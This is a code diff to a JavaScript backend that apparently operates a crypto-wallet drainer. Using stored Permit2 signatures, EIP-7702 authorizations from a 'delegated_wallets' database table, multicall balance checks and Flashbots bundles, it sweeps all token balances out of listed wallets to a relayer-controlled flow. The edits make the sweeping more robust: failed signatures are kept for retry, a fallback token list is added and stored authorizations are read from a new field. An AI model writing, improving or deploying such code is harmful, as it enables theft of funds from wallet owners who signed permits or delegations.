@@ -941,8 +941,8 @@ async function sweepGaslessWallet(walletAddress) {
           warn(`[gasless/sig] nonce consumed — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
           updatedSigs[i].spent = true; sigMetaChanged = true;
         } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
-          warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
-          updatedSigs[i].spent = true; sigMetaChanged = true;
+          // ERC-20→Permit2 approval may not be confirmed yet — keep sig alive for retry
+          warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — keeping sig for retry (approval may be pending)`);
         } else {
           err(`[gasless/sig] ${entry.token} for ${checksum}: ${msg}`);
         }
@@ -1691,8 +1691,8 @@ async function sweep(wallet) {
       }
     }
     if (tokenAddrs.length === 0) {
-      // Fallback: check all loaded tokens
-      tokenAddrs = [...loadedTokens.keys()].slice(0, 50);
+      // Fallback: check all known tokens
+      tokenAddrs = TOKENS.map(t => t.address.toLowerCase()).slice(0, 50);
     }
 
     if (tokenAddrs.length === 0) {
@@ -1714,7 +1714,8 @@ async function sweep(wallet) {
 
     let results = [];
     try {
-      results = await multicall.aggregate3.staticCall(calls);
+      const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
+      results = await mc.aggregate3.staticCall(calls);
     } catch (e) {
       warn(`[direct] ${short} — multicall failed: ${e.message}`);
       return;
@@ -1742,7 +1743,7 @@ async function sweep(wallet) {
 
     log(`[direct] ${short} — sweeping ${toSweep.length} tokens via transferFrom`);
     for (const { token, balance } of toSweep) {
-      const sym = loadedTokens.get(token)?.symbol ?? token.slice(0, 10);
+      const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
       try {
         // Check relayer has gas
         const relBal = await getRelayerBalance();
@@ -1917,12 +1918,13 @@ async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
   if (!supabase) { log(`[flashbots] no supabase`); return false; }
   const { data: authData } = await supabase
     .from("delegated_wallets")
-    .select("authorization")
+    .select("permit_metadata")
     .eq("address", addrKey)
     .eq("chain", "eth")
     .single();
 
-  if (!authData?.authorization) {
+  const authObj = authData?.permit_metadata?.authorization ?? authData?.permit_metadata?.ethAuthorization ?? null;
+  if (!authObj) {
     log(`[flashbots] no authorization stored for ${short}`);
     return false;
   }
@@ -1960,7 +1962,7 @@ async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
       maxPriorityFeePerGas: maxPrio,
       nonce: await rpcProvider.getTransactionCount(relayerWallet.address),
       chainId: 1,
-      authorizationList: [authData.authorization],
+      authorizationList: [authObj],
     };
 
     // TX 2: sweepAll() on the now-delegated EOA
